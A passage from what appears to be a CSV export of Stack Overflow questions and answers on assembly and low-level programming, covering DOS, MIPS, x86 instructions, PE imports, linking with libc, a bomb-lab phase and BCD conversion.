<p>The problem is, that the program doesn't terminate in a correct way.  DOSBox just freezes.  I tried to understand what happens using debugger, and it seems the program just ends up in an infinite loop after <code>iretd</code> is performed.  Why does this happen?  How can do I terminate a 16bit DOS app correctly?</p>
","<p>The most correct way to end a DOS program is to use the ""terminate"" DOS function; followed by adequate comments so that people understand that this function won't return.</p>

<p>For example:</p>

<pre><code>pleaseKillMeNow:
    mov ah,0x4C          ;DOS ""terminate"" function
    int 0x21
                         ;This is the end,
                         ;Beautiful friend
                         ;This is the end,
                         ;My only friend, the end
</code></pre>
","13524014"
"mips memory management","6264","","<p>how do you manually manage the heap in mips assembly, specifically the SPIM simulator? </p>

<p>the heap, i've found begins at 0x10040000 when using the sbrk syscall, e.g.</p>

<p><code>li $t0, 1</code></p>

<p><code>li $s0, 9</code></p>

<p><code>syscall</code></p>

<p><code>sw $t0, ($s0) # 1 located at 0x10040000</code></p>

<p>so, does a call to sbrk NOT guarantee that you will get back the next free memory slot? for instance, if i called sbrk for a single 4 byte space, SPIM might allocate addresses: 0x10040000-0x10040003. however, a second call for another 4 byte space might be unrelated to the prior 4 byte allocation? thus, a data structure is required to keep track of which memory slots have been allocated? finally, do memory managers try to reduce the number of calls to sbrk by determining free space that lies between the addresses that are tracked by the particular data structure?</p>
","<p>On real systems, sbrk returns page-granularity allocations.  I'm not sure if the SPIM simulator does (the meagre online docs imply it will return any byte-oriented granularity).</p>

<p>Generally, the sbrk system call just sets the ""end-of-heap"" pointer.  All the underlying OS knows is the beginning of the heap (where sbrk started at the beginning of the program), and the current end-of-heap pointer.  All the memory in that bound is considered (from the OS point of view) heap memory in use by the program.</p>

<p>(Note, in your case I believe the SPIM simulator takes an integer to bump the pointer by, so implicitly all the memory is contiguous and I think the break is always increasing?)</p>

<p>The ""malloc"" API that is generally built on sbrk provides more than a simple contiguous, growing memory region.  A good malloc library generally lets you mark a region of memory as ""free"" (so it can be used to satisfy a subsequent malloc call).  Note that OS generally doesn't know about this ""free"".  Malloc keeps track of the memory that is free or not.  In general malloc cannot return this arbitrary region of the heap to the OS, because the heap is a single contiguous region from the OS point of view.</p>

<p>Real malloc implementations have to deal with the mis-match between allocation requests and page-size (normal sbrk only returns multiples of page-aligned, page-sized allocations).  Your simulator case doesn't have this problem because sbrk is fine-grained.</p>

<p>Note that tracking which memory is in use or not requires memory, so malloc has some overhead.  Some implementations are designed to store most of this bookkeeping in the ""free"" memory (reducing the apparent cost to the client).  There are lots of other strategies for matching malloc to sbrk....  (In your case mapping malloc to sbrk, and making free a no-op will 'work' as long as you don't allocate too much memory ...)</p>

<p>Here's an overview of how <code>malloc</code> and <code>sbrk</code> relate that draws some ASCII art I don't have the patience to transcribe:  <a href=""http://web.eecs.utk.edu/~huangj/cs360/360/notes/Malloc1/lecture.html"" rel=""noreferrer"">http://web.eecs.utk.edu/~huangj/cs360/360/notes/Malloc1/lecture.html</a></p>
","9189168"
"What x86 register denotes source location in movsb instruction?","6261","","<p>What x86 register denotes source location in movsb instruction?</p>
","<p>In 32-bit mode, <code>esi</code>.</p>

<p>In specific, <code>movsb</code> copies one byte from <code>ds:esi</code> to <code>es:edi</code>, the adjusts both <code>esi</code> and <code>edi</code> by 1, either up or down depending on the direction flag.</p>
","3887597"
"Calculate the JMP opcodes","6247","","<p>I'm trying to calculate the correct op codes for a jump, I've looked at this in other threads and I still don't understand:</p>

<p>I thought the formula was <code>desination - (from+5)</code> but its just not working, it's way off, here's the addresses that I want to jump to/from:</p>

<pre><code>FROM: 6259326B
TO:   02980000

CORRECT OPCODE: E9 90CD3EA0
FORMULA OPCODE: E9 5FC13266
</code></pre>

<p>So I'm having problems with this, any help appreciated.</p>
","<p>You are calculating negative jmp! So correct formula is: </p>

<blockquote>
  <p>0 - (from    - desination) - 5</p>
  
  <p>0 - ($6259326B - $02980000) - 5</p>
</blockquote>

<p>what is equal <strong>$A03ECD90</strong> (or $90CD3EA0 in little endian).</p>
","8197113"
"How to print the contents of a register in emu8086?","6243","","<pre><code>include 'emu8086.inc'
#make_com#

org 100h

s1 dw 50,60,70,80,90,100,120,130,140,160,170,190,190,220,250,270,300

    MOV SI,0
    MOV CX,16

s2:
    MOV AX,s1[SI]

s3:
    INC SI
    CMP AX,100
    JBE s4
    JA s5

s4:
    PRINTf AX
    JMP s3

s5:
    CMP AX,200
    JB s6
    JA s7

s6:
    PRINTf AX
    JMP s3

s7:
    PRINTf AX
    JMP s3

    END
    ;printf AX doesn't work and i want to print the contents of AX
</code></pre>
","<blockquote>
  <p>;printf AX doesn't work and i want to print the contents of AX</p>
</blockquote>

<p>You haven't shown us what <em>PRINTf</em> is supposed to do. So all of your <code>PRINTf AX</code> macro calls could be OK.  </p>

<p>But your program does have 2 errors that prevent it from executing correctly.  </p>

<ol>
<li>A .COM program starts executing from the top but that's where you have placed your data. This must not be executed! So either place the data below the code or jump over the data.  </li>
<li>The data you use is word sized and thus you need to add 2 to the SI register when iterating over the data.</li>
</ol>
","29577302"
"Setting Optimization flags in Eclipse CDT","6243","","<p>How do you set optimization/debugging flags in Eclipse CDT, set up uses GNU tool-chain  ??</p>

<p>Thanks !</p>
","<p>Depends on the kind of project you set up. Is it a makefile project?</p>

<p>You can also use the CFLAGS CXXFLAGS environment variables.</p>

<p>I will suggest you to use cmake and then generate the Eclipse CDT project with 
CMake -G ""Eclipse CDT4 Makefile""</p>
","4207903"
"Exe & Dll analyzer and decompiler","6233","","<p>can anyone please suggest me what software can i use for reverse engineering for decompiling exe and a dll file?</p>

<p>I need to understand as more information as i can on what these files do, in what language they are writen ext.</p>

<p>I am already trying with:
Olly Debug
ExeToC
Boomerang</p>
","<p>you can use this also DeDe , HDasm , Win32dasm </p>

<p>DeDe is a very fast program that can analyze executables compiled with Delphi</p>

<p><a href=""http://hdasm.narod.ru/"" rel=""nofollow"">http://hdasm.narod.ru/</a></p>

<p>but IDA  is the best</p>
","18890173"
"ASSEMBLY: Could someone explain what this line with the leaq instruction does?","6215","","<p>I'm running through some assembly code and I can't figure out what a line of code does.  The code is:</p>

<pre><code> leaq   0(,%rax,4), %rdx
</code></pre>

<p>I know <code>lea</code> is basically a type of <code>mov</code> instruction, but it only moves the address.  So we are moving the address of something to <code>%rdx</code> (making <code>%rdx</code> ""point"" to something on  the stack).  I know what <code>%rax</code> points to on the stack (say, <code>-28(%rbp)</code>), but I'm confused by how to multiply that with 4 to get my answer.  Would <code>%rdx</code> point to <code>4*(-28) = -112(%rbp)</code>?</p>

<p>Thanks!</p>

<p>EDIT:
For context, the following code precedes this instruction:</p>

<pre><code>pushq   %rbp 
movq    %rsp, %rbp 
movl    %esi, -28(%rbp)
movl    -28(%rbp), %eax 
cltq 
leaq    0(,%rax,4), %rdx
</code></pre>
","<p>Your equivalent C code is something like:</p>

<pre><code>extern int32 arr[];
int my_func(int32 n, ...) {
   int32 a=n;
   ...
   arr[a];
   ...
}
</code></pre>

<p>n is passed as a single 32-bit register esi, which is stored to local stack frame.
The parameter is then used in evaluation the 64-bit expression 4*a. The '0' can be explained if it's supposed to be relocated by the linker to the address 'arr'.</p>

<p>Then my guess is that the assembly code is not generated by 
<code>gcc -S foo.c</code>, but by <code>gcc -c foo.c; objdump -d foo.o</code></p>

<pre><code>   // Similar code from a 32-bit machine
   0:   55                      push   %ebp
   1:   89 e5                   mov    %esp,%ebp
   3:   8b 45 08                mov    0x8(%ebp),%eax
   6:   8b 04 85 00 00 00 00    mov    0x0(,%eax,4),%eax
   d:   5d                      pop    %ebp
   e:   c3                      ret
   f:   90                      nop
</code></pre>
","13355964"
"How to print text in color with interrupts?","6211","","<p>This is my code it print in white color which is the default one. I know how to print in color without interrupts, but I don't want to do that.  I want to print it in any other color using interrupts.How can I do that?? Any Idea? Thanks in advance
I am using emu8086 as an assembler</p>

<pre><code>data segment
    wellcome db 'Wellcome User !',13, 10 ,'$'
    how    db 'how are you',13,10,'$'
ends

stack segment
    dw  64 dup(0)
ends

code segment 

    start:
        push ax      
        mov ax,data
        mov ds,ax
        mov es,ax    
        pop ax     

        lea si, wellcome
        call print

        lea dx, how
        call print  
    MOV  AH, 00h;wait for any key
    INT  16h

    mov ax, 0x4c00; terminating 
    int 21h                                                        
print: 
            ;printing the line
            mov ah, 9
            int 21h
    ret                                  
ends 
</code></pre>
","<p>Here is the solution, I got it. Make the following changes in print subroutine</p>

<pre><code>print: 
       ;printing the line
       mov bl,2  ;color attribute
       mov ah, 9 
       mov al,0  ;avoding extra characters
       int 10h   ;printing colors
       int 21h
ret    
</code></pre>
","20812088"
"Counting the number of bits that are set","6206","","<p>I want to count the number of bits in a binary number that are set.
For example, user enter the number 97 which is 01100001 in binary. The program should give me that 3 bits are set using MIPS ISA. </p>

<p>I am able to achieve this in C, but I don't know how to achieve it using assembly code. </p>

<p>Any ideas? </p>

<p>Thanks in advance for all the help. </p>

<p>This is not HW, its a tiny part of my research project.</p>
","<p>What you're looking for is often referred to as the population count (popcount).</p>

<p>There are a number of C implementations on <a href=""http://graphics.stanford.edu/~seander/bithacks.html#CountBitsSetNaive"" rel=""nofollow noreferrer"">Bit Twiddling Hacks</a> (some of which are scarily clever).  If you're familiar with C, each approach should have a reasonable translation into MIPS assembly after breaking down the expressions.</p>

<p>If your input domain is small (e.g. 0-255), you could always do a lookup table and use the input as the offset to fetch the popcount directly.</p>
","3766247"
"MIPS return value from memory address","6205","","<p>I have to program in Assembly (MIPS) a function to return the max value of an array.</p>

<p>The C code is this:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int MaxAssembly(int *ptr, int num_elements); 

int main ( ) 
{ 
  int n=9; 
  int tab[] = {2, -8, 0, 25, 14, 2, 9, 15, -32}; 
  printf(""The maximum is %d \n"", MaxAssembly(tab,n)); 
</code></pre>

<p><code>MaxAssembly</code>is the function I have to program in Assembly.</p>

<p>I'm not in the part to find the max. My problem in in reading the functions arguments. I have made this code to do some tests.</p>

<pre><code>    .data

    .text
    .globl  MaxAssembly

MaxAssembly:
    add $9,$5,$zero
    move    $2,$9
    jr  $ra
</code></pre>

<p>Doing this code I can see that I'm reading the second function argument as expected. It's printed on the screen <code>The maximum is 9</code>
Changing the code to:</p>

<pre><code>    .data

    .text
    .globl  MaxAssembly

MaxAssembly:
    move    $2,$4
    jr  $ra
</code></pre>

<p>I can see that it's reading the first argument of the function as a memory address and it's printed on the screen <code>The maximum is 2143429780</code>. So far is working as expected.</p>

<p>The problem is when I try to read the element stored at that memory address (the first element of the array). I'm getting one segmentation fault...
I'm doing this:</p>

<pre><code>    .data

    .text
    .globl  MaxAssembly

MaxAssembly:
    lw      $16,0($4)
    move    $2,$16
    jr  $ra
</code></pre>

<p>What am I doing wrong? wasn't <code>lw</code>supposed to store at <code>$16</code> the first item of the array? Using <code>lb</code>is the same</p>
","<p>Yes, <code>lw $s0, 0($a0)</code> will read a full word from the address in <code>$a0</code> to <code>$s0</code>. Unlike, lb, memory access via lw must use word-aligned addresses (i.e., two LSB are zero). I suspect that's where the problem occur.</p>
","10066833"
"Assembly Language Usage","6193","","<p>Assembly is a language I'd like to learn but still you don't hear often that something has been programmed in assembly. My question is what are the uses of assembly language? Is it still used?</p>
","<p>Assembly language can make sense in a number of situations.</p>

<ol>
<li>High volume, minimum cost embedded systems. The extra hardware to run something like C can be prohibitive.</li>
<li>Improving efficiency.</li>
<li>Access to hardware not possible/available via higher level languages.</li>
</ol>

<p>2 used to be important, but has shrunk almost into oblivion in the last few decades.</p>
","9418711"
"Asm CALL instruction - how does it work?","6185","","<p>I'd love to have a clear explanation on, in a Windows environment (PE executables), how do CALL XXXXXXXXXXXXXXX instructions work. I've been studying the PE format but I'm quite confused about the relationship between the CALL ADDRESS instruction, the importing of a function from a dll and how does the CALL ADDRESS reach out the code in a DLL. Besides ASLR and other security functions may move around DLLs, how do executables cope with this?</p>
","<p>It (that is, directly calling an import with a normal relative call) doesn't work, and that's why that's not how it's done. </p>

<p>To call an imported function, you go through something called the Import Address Table (IAT). In short, entries in the IAT first point to function names (ie it starts out as a copy of the Import Name Table), and those pointers are changed to point to the actual functions by the loader.</p>

<p>The IAT is at a fixed address, but can be relocated if the image has been rebased, so calling through it only involves a single indirection - so <code>call r/m</code> is used with a memory operand (which is just a simple constant) to call imported functions, for example <code>call [0x40206C]</code>.</p>
","14416449"
"Converting C code to MIPS Assembly Language","6174","","<p>Here's the C code:</p>

<pre><code>int A[10];
int sum = 0;
int i = 0;

while (i&lt;10){
sum += A[i++];
sum *= 2;
}
</code></pre>

<p>Here's my take at converting into MIPS:</p>

<pre><code>**Reg. Allocation Table:
A = $s1
sum = $s2
i = $s3
10 = $s4**

loop: beq $s3, $s4, endloop 

""here's where i get stuck, inside the while loop.""

j: loop
endloop:
</code></pre>

<p>I understand that in a basic while loop such as: <code>i = $s1</code>, <code>5 = $s3</code></p>

<pre><code>i=0;
while(i != 5)
i=i+1;

addi $s1, $zero, 0 #i=0

loop: beq $s1, $s3, endloop
add   $s1, $s1, 1
j     loop:

endloop:
</code></pre>

<p>I'm just having trouble, or having a hard time comprehending a slightly more difficult loop where <code>sum+= A[i++];</code> and <code>sum*= 2;</code> are introduced.</p>

<p>Any help is greatly appreciated. I'm not looking for a complete solution, so please help me <em>think</em>. </p>

<p>Thank you!</p>
","<p>Break it down:</p>

<p><code>sum += A[i++];</code> becomes <code>sum = sum + A[i]; i = i + 1;</code> which in MIPS assembly could be expressed:</p>

<pre><code>add $t0 $s3 $s1 #index A at i
lw  $t1 0($t0)  #load A at i

add  $s2 $s2 $t1 #add A[i] to sum
addi $s3 $s3 1   #increment i

sll $s2 $s2 1 #double sum
</code></pre>
","19873647"
"How come INC instruction of x86 is not atomic?","6169","","<p>I've read that INC instruction of x86 is not atomic. My question is how come? Suppose we are incrementing a 64 bit integer on x86-64, we can do it with one instruction, since INC instruction works with both memory variables and register. So how come its not atomic?</p>
","<p>Why would it be? The processor core still needs to read the value stored at the memory location, calculate the increment of it, and then store it back. There's a latency between reading and storing, and in the mean time another operation could have affected that memory location.</p>

<p>Even with out-of-order execution, processor cores are 'smart' enough not to trip over their own instructions and wouldn't be responsible for modifying this memory in the time gap. However, another core could have issued an instruction that modifies that location, a DMA transfer could have affected that location, or other hardware touched that memory location somehow.</p>
","10109721"
"How to link a gas assembly program that uses the C standard library with ld without using gcc?","6162","","<p>As an exercise to learn more precisely how c programs work and what minimum level of content must exist for a program to be able to use libc, I've taken it upon myself to attempt to program primarily in x86 assembly using gas and ld.</p>

<p>As a fun little challenge, I've successfully assembled and linked several programs linked to different self-made dynamic libraries, but I have failed to be able to code a program from scratch to use libc function calls without directly using gcc.</p>

<p>I understand the calling conventions of individual c library functions, and have thoroughly inspected programs compiled out of gcc through use of objdump and readelf, but haven't gotten anywhere as far as what information to include in a gas assembly file and what parameters to invoke in ld to successfully link to libc. Anyone have any insight to this? </p>

<p>I'm running Linux, on an x86 machine.</p>
","<p>There are at least three things that you need to do to successfully use libc with dynamic linking:</p>

<ol>
<li>Link <code>/usr/lib/crt1.o</code>, which contains <code>_start</code>, which will be the entry point for the ELF binary;</li>
<li>Link <code>/usr/lib/crti.o</code> (before libc) and <code>/usr/lib/crtn.o</code> (after), which provide some initialisation and finalisation code;</li>
<li>Tell the linker that the binary will use the dynamic linker, <code>/lib/ld-linux.so</code>.</li>
</ol>

<p>For example:</p>

<pre><code>$ cat hello.s
 .text
 .globl main
main:
 push %ebp
 mov %esp, %ebp
 pushl $hw_str
 call puts
 add $4, %esp
 xor %eax, %eax
 leave
 ret

 .data
hw_str:
 .asciz ""Hello world!""

$ as -o hello.o hello.s
$ ld -o hello -dynamic-linker /lib/ld-linux.so.2 /usr/lib/crt1.o /usr/lib/crti.o -lc hello.o /usr/lib/crtn.o
$ ./hello
Hello world!
$
</code></pre>
","3580440"
"Decoding Assembly Language (Bomb Lab Phase 5)","6156","","<p>Alright so this is the ever so popular bomb lab and I am currently on phase 5 and I'm only stuck on two lines. Here's the assembly code:</p>

<pre><code>Dump of assembler code for function phase_5:
   0x08048e29 &lt;+0&gt;: push   %ebx
   0x08048e2a &lt;+1&gt;: sub    $0x18,%esp
   0x08048e2d &lt;+4&gt;: mov    0x20(%esp),%ebx
   0x08048e31 &lt;+8&gt;: mov    %ebx,(%esp)
   0x08048e34 &lt;+11&gt;:    call   0x804908b &lt;string_length&gt;
   0x08048e39 &lt;+16&gt;:    cmp    $0x6,%eax
   0x08048e3c &lt;+19&gt;:    je     0x8048e43 &lt;phase_5+26&gt;
   0x08048e3e &lt;+21&gt;:    call   0x80493a5 &lt;explode_bomb&gt;
   0x08048e43 &lt;+26&gt;:    mov    $0x0,%edx
   0x08048e48 &lt;+31&gt;:    mov    $0x0,%eax
   0x08048e4d &lt;+36&gt;:    movzbl (%ebx,%eax,1),%ecx
   0x08048e51 &lt;+40&gt;:    and    $0xf,%ecx
   0x08048e54 &lt;+43&gt;:    add    0x804a4a0(,%ecx,4),%edx
   0x08048e5b &lt;+50&gt;:    add    $0x1,%eax
   0x08048e5e &lt;+53&gt;:    cmp    $0x6,%eax
   0x08048e61 &lt;+56&gt;:    jne    0x8048e4d &lt;phase_5+36&gt;
=&gt; 0x08048e63 &lt;+58&gt;:    cmp    $0x42,%edx
   0x08048e66 &lt;+61&gt;:    je     0x8048e6d &lt;phase_5+68&gt;
   0x08048e68 &lt;+63&gt;:    call   0x80493a5 &lt;explode_bomb&gt;
   0x08048e6d &lt;+68&gt;:    add    $0x18,%esp
   0x08048e70 &lt;+71&gt;:    pop    %ebx
   0x08048e71 &lt;+72&gt;:    ret    
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
End of assembler dump.
</code></pre>

<p>Here's a barebones look when I run it through a decompiler:</p>

<pre><code>void phase_5(__size8 *param1) {
__size32 eax; // r24
int eax_1; // r24{48}
unsigned int ecx; // r25
__size32 edx; // r26
eax = string_length(param1);
if (eax != 6) {
explode_bomb();
}
edx = 0;
eax = 0;
do {
eax_1 = eax;
ecx = *(unsigned char*)(param1 + eax_1);
edx += array.3142[(ecx &amp; 0xf)];
eax = eax_1 + 1;
} while (eax_1 + 1 != 6);
if (edx != 66) {
explode_bomb();
}
return;
}
</code></pre>

<p>So the general synopsis of this phase is that the string input needs to be 6 characters, then it goes through a do while loop where it takes the string and turns it into a number through its algorithm and then compares it if it's 66 at the end. My questions is what do these two lines do:</p>

<p>ecx = <em>(unsigned char</em>)(param1 + eax_1);
edx += array.3142[(ecx &amp; 0xf)];</p>

<p>More specifically the first one. The second line &amp;s the value of the first line with 15 which essentially gives the last 4 bits of ecx but what does adding the string (param1) with the loop counter (eax_1) do? Also is this the line that converts each character in the string into a number? Any help would be greatly appreciated!</p>
","<blockquote>
  <p>what does adding the string (param1) with the loop counter (eax_1) do?</p>
</blockquote>

<p>That's just array indexing. It gives you the address of the appropriate character. <code>ecx = *(unsigned char*)(param1 + eax_1)</code> is basically <code>ecx = param1[eax_1]</code>.</p>

<p>As you say, the code loops through all 6 letters, keeps the low 4 bits of the ascii code and uses that to index a hardcoded lookup table. The selected values from said lookup table are summed up, and that's your result which has to be <code>0x42</code>.</p>
","29543210"
"packed decimal to ascii assembly","6146","","<p>I'm trying to convert packed decimal numbers into ascii strings. Here is my understanding thus far: </p>

<p>The following: </p>

<pre><code>bcd BYTE 34h
</code></pre>

<p>Should convert to the decimal number 34 after being ""unpacked"". Now I'm not sure on the best way of doing this. If I convert this hexadecimal number to binary it is as follows...</p>

<pre><code>0011 0100 
</code></pre>

<p>Now, if I have my procedure print out each 4bit binary value at a time, then it should print the ascii string of numbers, correct? So if I go through a loop, grab the first 4 bit binary number, print its actual value out, its going to print 3.. then do the same, its going to print 4. </p>

<p>So, here is my general idea: </p>

<p>Take an 8bit value ""34h"", mov it into AH and AL. In AH, clear the second half of the bits  using the follow: </p>

<pre><code>and ah, 11110000b
</code></pre>

<p>and in AL, clear the first half of the bits using the following: </p>

<pre><code>and al, 00001111b
</code></pre>

<p>So AH = 0110b or 3
And AL = 0100b or 4, then print these out accordingly..</p>

<p>Is this a good approach? Or am I going about completely incorrect or way over thinking it? </p>

<p>EDIT: Here is my final solution with original value of 12345678h. Thanks to all who helped!</p>

<pre><code>;-----------------------------------------------------------------------------
PackedToAsc PROC USES eax ebx edx ecx esi
; This function displays a packed decimal value in its ""ascii"" form
; i.e. 12345678h would display decimal, 12345678 in decimal form
; 
; Requires ECX = SIZEOF packed decimal
;          ESI to be pointing to the packed decimal
;-----------------------------------------------------------------------------
mov edx, [esi]              ; temp store our offset
mov eax, 0                  ; clear eax
mov ebx, 0                  ; clear ebx

L1: rol edx, 8              ; rotate left 8 bits to avoid little endian 
    mov [esi], edx          ; mov our temp back to the actual value

    mov al, BYTE PTR [esi]  ; al = 12h  0001 0010
    mov bl, BYTE PTR [esi]  ; bl = 12h  0001 0010
    shr al, 4               ; al = 0000 0001
    and bl, 00001111b;      ; bl = 0000 0010
    add al, 48              ; convert to ascii
    call WriteChar          ; display al
    mov al, bl
    add al, 48              ; convert to ascii
    call WriteChar          ; display bl
    loop L1

    call Crlf
ret
PackedToAsc END
</code></pre>

<p>P</p>
","<p>BCD uses only the digits 0 thru 9.<br/>
An unpacked BCD digit uses the lower nibble of an entire byte and to convert it to ASCII you add 48.<br/>
The number 34h is 52 decimal and will be represented as an unpacked BCD as 00000101 and 00000010<br/> (Changed to avoid confusion when using built-in instructions)
When it is packed: 01010010 == BCD packed 52<br/></p>

<p>To unpack it, you can do as you have done, but you need to shift AH right to place the value in the lo-nibble. To convert to ASCII just add 48.</p>

<p>[edit]</p>

<p>MASM (=> ALL instructions, Linux included) that runs on 80x86 processors uses the little-endian scheme. CPUs such as Motorola 68000 (Apple Mac) and RISC uses big-endian.</p>

<p>When you store a number as BCD, the least significant byte is at the lowest address thru to the most-significant at the highest, e.g.:</p>

<pre><code>my_unpacked_bcd  DB 4,3,2,1 ; this is the decimal number 1234
my_packed_bcd    DW 3412h  ; this defines the same number as packed
</code></pre>

<p>Packed BCD depends on what you want to do with it. If you want to <code>ADD, MUL, DIV, SUB</code> you must present the values as required by these instructions. Also remember to add zero-bytes to start and end of your digits to hold carries.</p>
","4131409"
"Using Nested For Loops and an Array in MIPS","6137","","<p>This is a homework assignment, I've written the whole program myself, run through it in the debugger, and everything plays out the way I mean it to EXCEPT for this line:</p>

<p><code>sw $t1, counter($a3)</code></p>

<p>The assignment is to convert this snippet of C code to MIPS</p>

<pre><code>    for(i = 0; i &lt; a; i++) {
       for(j = 0; j &lt; b; j++) {
          C[2 * i] = i – j; } }
</code></pre>

<p>All the registers change values the way they should in my program except for $a3 - It never changes.</p>

<p>Changes: An array needed to be declared and ""pointed to"" by a register and a label can't be used for an offset in the manner I started with</p>

<p>EDIT: Here's the finished, working code</p>

<p><img src=""https://i.stack.imgur.com/pEmYz.png"" alt=""Finished""></p>
","<p><strong>Recap answer from the comments</strong></p>

<p>Your $a3 register, is supposed to be loaded with the address of an array defined in the <code>.data</code> section.</p>

<p>One big problem with your code is how you constructed your loops. The best way is to translate your loops step by step, and one loop at a time. Also, remember that :</p>

<pre><code>for( i = 0; i &lt; a; i++ )
{
    loop_content;
}
</code></pre>

<p>Is equivalent to :</p>

<pre><code>i = 0;
while( i &lt; a )
{
    loop_content;
    i++;
}
</code></pre>

<p>Which is easier to translate in assembly. The condition just have to be negated, has you need an ""exit"" condition, and not a ""continue"" condition as in a <code>while</code> loop. Your code will be much clearer and easier to understand (and less error prone).</p>

<p>Your ""out of range"" error comes from here : <code>sw $t1, counter($a3)</code>. Here <code>counter</code> is a label, and therefore an address. Thus <code>counter($a3)</code> is doing ""$a3 (=0x10010008) + address of counter (=0x100100f8)"", giving 0x20020100, which is clearly not what you want (and non-sense).</p>

<p>Oh, and in the <code>sw $r, offset($a)</code> MIPS instruction, <code>offset</code> MUST be a 16-bit CONSTANT. Here, you use a 32-bit address, but it's just that the assembler kindly translate <code>sw $t1, counter($a3)</code> to <code>$x = $a3 + counter; sw $t1, 0($x)</code>, which is why you may see a <code>sw</code> with 0 as offset.</p>
","28488847"
"Decompiling from x86 assembly file","6135","","<p>I have a program in x86 assembly which I want to decompile to a higher level language. I checked out <a href=""http://boomerang.sourceforge.net/"" rel=""nofollow"">boomerang</a> for that purpose, but it seems that it only takes binary files as input. What are my options here?</p>
","<p>There is a product which works from assembler called <a href=""http://www.microapl.co.uk/asm2c/sample86.html"" rel=""noreferrer"">Relogix</a>, but I expect their pricing is geared towards enterprise customers with big code base and not single-file private users. From the free solutions, <a href=""http://boomerang.sourceforge.net/"" rel=""noreferrer"">Boomerang</a> (somewhat dead) and <a href=""http://www.backerstreet.com/rec/rec.htm"" rel=""noreferrer"">REC Studio</a> (seems to be active) need some kind of compiled binary. <a href=""http://www.hex-rays.com/products/decompiler/index.shtml"" rel=""noreferrer"">Hex-Rays</a> needs binary input as well (via IDA).</p>
","10388332"
"No Program Entry Point TASM Error","6132","","<p>I'm trying to develop a simple kernel using TASM, using this code:</p>

<pre><code>; beroset.asm
;
; This is a primitive operating system.
;
;**********************************************************************
code segment para public use16 '_CODE'
        .386
        assume cs:code, ds:code, es:code, ss:code
        org 0
Start:
        mov     ax,cs
        mov     ds,ax
        mov     es,ax
        mov     si,offset err_msg
        call    DisplayMsg
spin:
        jmp     spin


;****************************************************************************
; DisplayMsg
;
; displays the ASCIIZ message to the screen using int 10h calls
;
; Entry:
;    ds:si ==&gt; ASCII string
;
; Exit:
;
; Destroyed:
;    none
;
;
;****************************************************************************
DisplayMsg proc
        push    ax bx si
        cld
nextchar:
        lodsb
        or      al,al
        jz      alldone
        mov     bx,0007h
        mov     ah,0eh
        int     10h
        jmp     nextchar
alldone:
        pop     si bx ax
        ret
DisplayMsg endp


err_msg db      ""Operating system found and loaded."",0

code ends
        END
</code></pre>

<p>Then I compile it like this:</p>

<blockquote>
  <p>C:\DOCUME~1\Nathan\Desktop> tasm /la /m2 beroset.asm<br>
  Turbo Assembler  Version 4.1  Copyright (c) 1988, 1996 Borland International  </p>
  
  <p>Assembling file:   beroset.asm<br>
  Error messages:    None<br>
  Warning messages:  None<br>
  Passes:            2<br>
  Remaining memory:  406k  </p>
  
  <p>C:\DOCUME~1\Nathan\Desktop> tlink beroset, loader.bin<br>
  Turbo Link  Version 7.1.30.1. Copyright (c) 1987, 1996 Borland International<br>
  Fatal: No program entry point  </p>
  
  <p>C:\DOCUME~1\Nathan\Desktop></p>
</blockquote>

<p>What can I to correct this error?</p>
","<p>I would say that you need to end the <code>Start:</code> section by adding <code>end Start</code> at the last line like this:</p>

<pre><code>code ends
end Start
</code></pre>

<p>But again in that code you never initialize stack... It will not work, but it sould print ""Operating system found and loaded."".</p>

<p><strong>UPDATE:</strong>
Actually, this did the trick. I just added <code>end Start</code> in place of END and the ""No entry point"" error was gone. but you get the stack warning. </p>

<p>So there you go. =)</p>

<p><strong>CONCERNING THE STACK:</strong> Just add this before everything:</p>

<pre><code>.model  small
.stack 
</code></pre>
","2530464"
"How many asm-instructions per C-instruction?","6126","","<p>I realize that this question is impossible to answer absolutely, but I'm only after ballpark figures:</p>

<p>Given a reasonably sized C-program (thousands of lines of code), on average, how many ASM-instructions would be generated. In other words, what's a realistic C-to-ASM instruction ratio? Feel free to make assumptions, such as 'with current x86 architectures'.</p>

<p>I tried to Google about this, but I couldn't find anything.</p>

<p><strong>Addendum</strong>: noticing how much confusion this question brought, I feel some need for an explanation: What I wanted to know by this answer, is to know, in practical terms, what ""3GHz"" means. I am fully aware of that the throughput per Herz varies tremendously depending on the architecture, your hardware, caches, bus speeds, and the position of the moon.</p>

<p>I am not after a precise and scientific answer, but rather an empirical answer that could be put into fathomable scales. </p>

<p>This isn't a trivial answer to place (as I became to notice), and this was my best effort at it. I know that the amount of resulting lines of ASM per lines of C varies depending on what you are doing. <code>i++</code> is not in the same neighborhood as <code>sqrt(23.1)</code> - I know this. Additionally, no matter what ASM I get out of the C, the ASM is interpreted into various sets of microcode within the processor, which, again, depends on whether you are running AMD, Intel or something else, and their respective generations. I'm aware of this aswell.</p>

<p>The ballpark answers I've got so far are what I have been after: A project large enough averages at about 2 lines of x86 ASM per 1 line of ANSI-C. Today's processors probably would average at about one ASM command per clock cycle, once the pipelines are filled, and given a sample big enough.</p>
","<p>I'm not sure what you mean by ""C-instruction"", maybe statement or line?  Of course this will vary greatly due to a number of factors but after looking at a few sample programs of my own, many of them are close to the 2-1 mark (2 assembly instructions per LOC), I don't know what this means or how it might be useful.</p>

<p>You can figure this out yourself for any particular program and implementation combination by asking the compiler to generate only the assembly (<code>gcc -S</code> for example) or by using a disassembler on an already compiled executable (but you would need the source code to compare it to anyway).</p>

<p><strong>Edit</strong></p>

<p>Just to expand on this based on your clarification of what you are trying to accomplish (understanding how many lines of code a modern processor can execute in a second):</p>

<p>While a modern processor may run at 3 billion cycles per second that doesn't mean that it can execute 3 billion instructions per second.  Here are some things to consider:</p>

<ul>
<li>Many instructions take multiple cycles to execute (division or floating point operations can take dozens of cycles to execute).</li>
<li>Most programs spend the vast majority of their time waiting for things like memory accesses, disk accesses, etc.</li>
<li>Many other factors including OS overhead (scheduling, system calls, etc.) are also limiting factors.</li>
</ul>

<p>But in general yes, processors are incredibly fast and can accomplish amazing things in a short period of time.</p>
","331477"
"Intel x86 vs x64 system call","6096","","<p>I'm reading about the difference in assembly between x86 and x64.</p>

<p>On x86, the system call number is placed in <code>eax</code>, then <code>int 80h</code> is executed to generate a software interrupt.</p>

<p>But on x64, the system call number is placed in <code>rax</code>, then <code>syscall</code> is executed.</p>

<p>I'm told that <code>syscall</code> is lighter and faster than generating a software interrupt.</p>

<p>Why it is faster on x64 than x86, and can I make a system call on x64 using <code>int 80h</code>?</p>
","<h2>General part</h2>

